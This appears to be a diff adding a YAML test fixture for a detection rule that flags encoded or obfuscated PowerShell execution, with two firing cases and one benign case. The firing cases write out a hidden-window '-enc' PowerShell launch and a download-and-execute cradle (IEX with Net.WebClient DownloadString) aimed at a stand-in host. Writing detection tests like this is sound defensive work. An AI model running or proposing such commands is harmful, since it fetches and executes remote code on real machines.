@@ -1,0 +1,15 @@
+# Tests for E-004 — Encoded or Obfuscated PowerShell Execution. Synthetic data only.
+rule: E-004_encoded_powershell
+cases:
+  - name: powershell with -enc fires
+    should_fire: true
+    events:
+      - { Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell -nop -w hidden -enc SQBFAFgA...', ParentImage: 'C:\Windows\System32\cmd.exe', SubjectUserName: attacker }
+  - name: powershell downloadstring fires
+    should_fire: true
+    events:
+      - { Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: "powershell IEX(New-Object Net.WebClient).DownloadString('http://x/y')", ParentImage: 'C:\Windows\explorer.exe', SubjectUserName: attacker }
+  - name: benign powershell does not fire
+    should_fire: false
+    events:
+      - { Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell Get-Service', ParentImage: 'C:\Windows\explorer.exe', SubjectUserName: jsmith }
